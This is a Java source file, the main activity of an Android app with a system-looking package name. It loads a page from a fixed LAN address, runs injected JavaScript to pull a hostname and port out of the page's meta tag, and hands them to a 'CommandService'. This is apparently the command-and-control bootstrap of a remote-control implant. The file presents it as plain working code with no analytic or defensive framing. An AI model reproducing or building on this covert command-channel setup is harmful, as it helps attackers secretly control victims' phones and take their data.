package com.android.a2faces;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.webkit.ValueCallback;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.appcompat.app.AppCompatActivity;


public class MainActivity extends AppCompatActivity {
    WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webview);

        //enable javascript by default
        webView.getSettings().setJavaScriptEnabled(true);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                //enable javascript code injection - it will be disabled after use
                //webView.getSettings().setJavaScriptEnabled(true);

                webView.evaluateJavascript("(function() { return document.querySelector('meta[name=\"description\"]').content })();", new ValueCallback<String>() {
                    @Override
                    public void onReceiveValue(String javascriptResult) {
                        //disable javascript code injection after use -> security reason
                        //webView.getSettings().setJavaScriptEnabled(false);
                        Log.d("JavascriptResult", javascriptResult);
                        javascriptResult = javascriptResult.replace("\"", "");
                        String[] socketMasterParams = javascriptResult.split(":");

                        Intent intent = new Intent(getApplicationContext(), CommandService.class);
                        intent.putExtra("hostname", socketMasterParams[0]);
                        intent.putExtra("port", Integer.parseInt(socketMasterParams[1]));
                        startService(intent);
                    }
                });

            }
        });

        webView.loadUrl("http://192.168.1.5:9999/index");
    }
}
